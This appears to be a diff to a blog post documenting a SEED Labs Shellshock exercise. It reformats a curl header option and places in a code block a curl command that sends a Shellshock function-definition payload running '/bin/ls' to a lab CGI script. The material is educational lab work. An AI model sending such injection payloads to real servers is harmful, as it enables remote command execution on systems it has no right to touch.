@@ -49,7 +49,7 @@ Curl allows users to control most fields in an HTTP request. Some of the options
 
 - `-e` or `--referer`: this is used to set a custom referer url
 
-- `-H` or `--header`: this is used to set a custom HTTP header value in the form of `KEY:VALUE`
+- `-H` or `--header`: this is used to set a custom HTTP header value in the form of "KEY:VALUE"
 
 ___
 
@@ -155,7 +155,9 @@ From the screenshot above, we can see that the server responded with an error. T
 
 Does that mean if we encode the whitespace, the attack will then be successful? To verify this, we can craft the following command: `http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`
 
-`curl --get --data "()%20{%20dummy;};%20echo;%20/bin/ls" www.seedlab-shellshock.com/cgi-bin/vul.cgi -v`
+```bash
+curl --get --data "()%20{%20dummy;};%20echo;%20/bin/ls" www.seedlab-shellshock.com/cgi-bin/vul.cgi -v`
+```
 
 ![task-2-g](https://github.com/iukadike/blog/assets/58455326/2c583bdf-e4da-419e-9a0e-c3b634d23805)
 
